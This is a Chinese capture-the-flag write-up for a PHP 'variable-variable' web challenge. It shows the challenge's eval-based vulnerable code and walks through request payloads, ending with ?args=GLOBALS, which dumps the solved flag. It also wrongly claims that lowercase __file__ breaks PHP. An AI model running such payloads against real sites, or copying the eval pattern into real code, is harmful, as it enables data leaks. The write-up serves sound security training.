# Web-变量1-解题思路

题目描述:
```
题目变量1
```
打开网页之后映入眼帘的就是如下的内容:
```
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```
分析这段`php`代码的内容:
```php
error_reporting(0);          // 关闭错误报告,防止暴露路径或警告
include "flag1.php";         // 包含外部文件,通常在其中定义敏感变量(如 $flag)
highlight_file(__file__);    // 输出当前文件源码(自身高亮显示)
if(isset($_GET['args'])){    // 检查 GET 参数 args 是否存在
    $args = $_GET['args'];   // 获取参数值
    if(!preg_match("/^\w+$/",$args)){   // 正则限制:仅允许字母|数字|下划线
        die("args error!");             // 不符合则终止
    }
    eval("var_dump($$args);");          // 执行变量变量的 var_dump
}
```
具体的函数注释如下:

在 PHP 中,代码里调用的部分可分为**核心函数**(Functions)和**语言结构**
(Language constructs,本质是语法关键字,但形式上像函数调用).

为了严谨回答,我按调用顺序列出它们的**完整签名(Signature)**和**含义**.

注意:代码中 `__file__` 有误,应为魔术常量 `__FILE__`(全大写),以下按正确意图解释.

---

### 1. `error_reporting(0)`
- **类型**:核心函数
- **完整签名**:`error_reporting(?int $error_level = null): int`
- **解释**:设置当前脚本的**错误报告级别**.
传入 `0` 表示关闭所有 PHP 错误|警告和提示的输出(`E_ALL & ~E_ALL`).主
要用于防止敏感路径信息或报错内容暴露给前端.

---

### 2. `include "flag1.php"`
- **类型**:语言结构(特殊语句,非函数)
- **原型**:`include string $filename`
- **解释**:在脚本执行点**包含并运行**指定文件.此处用于引入 `flag1.php`,
该文件通常用于定义敏感变量(如 `$flag`).
如果文件不存在,会抛出一个警告(`E_WARNING`),
但脚本继续运行(由于 `error_reporting(0)`,该警告被屏蔽).

---

### 3. `highlight_file(__file__)`
- **类型**:核心函数
- **完整签名**:`highlight_file(string $filename, bool $return = false): string|bool`
- **解释**:将指定文件的源码内容进行**语法高亮处理**并直接输出.
这里应使用魔术常量 `__FILE__`(当前文件绝对路径),
作用是**把自己(当前 PHP 文件)的源码彩显打印到浏览器上**.
若第二个参数 `$return` 未设置(默认为 `false`),则直接打印;若失败返回 `false`.

---

### 4. `isset($_GET['args'])`
- **类型**:语言结构
- **原型**:`isset(mixed $var, mixed ...$vars): bool`
- **解释**:检测变量是否**已声明且不为 `NULL`**.
此处用于判断 URL 查询参数中是否传递了 `args` 键(如 `?args=xxx`).

注意:`$_GET` 是超全局数组,本身不是函数.

---

### 5. `preg_match("/^\w+$/", $args)`
- **类型**:核心函数(PCRE 正则库)
- **完整签名**:`preg_match(string $pattern, string $subject, array &$matches = null, int $flags = 0, int $offset = 0): int|false`
- **解释**:执行一个正则表达式匹配.
此处检查 `$args` 是否完全由字母|数字|下划线组成
(`\w` 等价于 `[A-Za-z0-9_]`,`^` 和 `$` 限定从头到尾).
匹配成功返回 `1`,失败返回 `0`,错误返回 `false`.
目的是过滤用户输入,防止代码注入,但在此场景下过滤不充分.

---

### 6. `die("args error!")`
- **类型**:语言结构(`exit` 的别名)
- **原型**:`die(string|int $status = ""): void`
- **解释**:输出字符串 `"args error!"` 并立即**终止当前脚本**的执行.
当正则匹配失败(用户输入含非法字符)时,用来拦截请求并报错.

---

### 7. `eval("var_dump($$args);")`
- **类型**:语言结构(非函数,因为 `eval()` 是特殊的语法结构)
- **原型**:`eval(string $code): mixed`
- **解释**:将字符串 `"var_dump($$args);"` **当作 PHP 代码来执行**.
这里执行的是动态拼接后的代码.
  - 内层调用了 `var_dump`(见下条).
  - 关键在于 `$$args`(可变变量),
例如若 `$args = "flag"`,实际执行的代码是 `var_dump($flag);`.

---

### 8. `var_dump($$args)`
- **类型**:核心函数
- **完整签名**:`var_dump(mixed ...$vars): void`
- **解释**:打印一个或多个变量的**类型和值**信息(包含长度|递归层级等).
在此代码中,它被 `eval` 动态调用,
用于输出由用户传入变量名所对应的变量内容(如 `$flag` 或 `$GLOBALS`),
从而泄露敏感信息.

---

### 额外说明
- **`$_GET`** 虽非函数,但作为超全局数组出现在 `isset()` 中,常用于接收 URL 参数.
- **魔术常量**:`__FILE__`
(代码中写成了小写,PHP 大小写敏感,原代码会报错,正确的应为 `__FILE__`).

## 绕过思路

```php
error_reporting(0);          // 关闭错误报告,防止暴露路径或警告
include "flag1.php";         // 包含外部文件,通常在其中定义敏感变量(如 $flag)
highlight_file(__file__);    // 输出当前文件源码(自身高亮显示)
if(isset($_GET['args'])){    // 检查 GET 参数 args 是否存在
    $args = $_GET['args'];   // 获取参数值
    if(!preg_match("/^\w+$/",$args)){   // 正则限制:仅允许字母|数字|下划线
        die("args error!");             // 不符合则终止
    }
    eval("var_dump($$args);");          // 执行变量变量的 var_dump
}
```
我们以终点为起点.
首先想让eval执行什么?
`eval("print($flag)")`
而`var_dump`和`print`作用都是打印变量值.
所以我们只需要进行关注`$args={一个变量X}`,并且这个变量内部存储着`flag{}`信息.
我们需要让这个`变量X`内容指向`flag{}`信息.

那么我们在地址栏`GET`访问,构造查询语句时,额外构造一个变量传入是否可以?

## 第一次攻击`/?b=$flag&&args=b`
例如:`/?b=$flag&&args=b`

答案是不行:
变量 $b 是否存在?
PHP 默认不会将 GET 参数自动注册为普通变量
(`register_globals` 自 PHP 5.4 起彻底移除,现代环境均为 Off).

因此 `$b` 并未定义,`var_dump($b)` 会输出 `NULL`
(由于 `error_reporting(0)`,不会显示 `Undefined variable` 警告).

所以这个 `payload` 无法获取 `flag`.

## 第二次攻击`/?args=flag`
既然访问外部变量是不行的,那么我直接访问内部变量行不行?
这里假定`flag1.php`定义了一个名为`flag`的变量.

尝试访问`/?args=flag`
```html
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
NULL
```
看来`flag1.php`里面并没有定义名为`flag`的变量.
## 第三次攻击`/?args=GLOBALS`
`php`语言提供了一个全局哈希表变量`GLOBALS`,
用来存储定义内的所有变量名和变量值.
我们直接让`args=GLOBALS`,打印所有的变量值,看看能不能找到`flag{}`信息.

尝试访问`/?args=GLOBALS`
```html
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
array(7) { ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } ["ZFkwe3"]=> string(38) "flag{dcc4c280643fbe350b5b5a375d1a3a07}" ["args"]=> string(7) "GLOBALS" ["GLOBALS"]=> *RECURSION* }
```
找到了`flag{dcc4c280643fbe350b5b5a375d1a3a07}`,尝试提交.

提交通过,答题结束.

## 🧠 AI 补充建议(对读者的额外提示)

- 若 Flag 不在 `$GLOBALS` 中,也可以尝试 `$_ENV`|`$_SERVER` 等超全局变量,
但本题已足够.

- 实际安全修复应**彻底移除该调试功能**,而非试图过滤输入,
因为 `\w+` 无法阻止 `GLOBALS` 这类合法变量名.
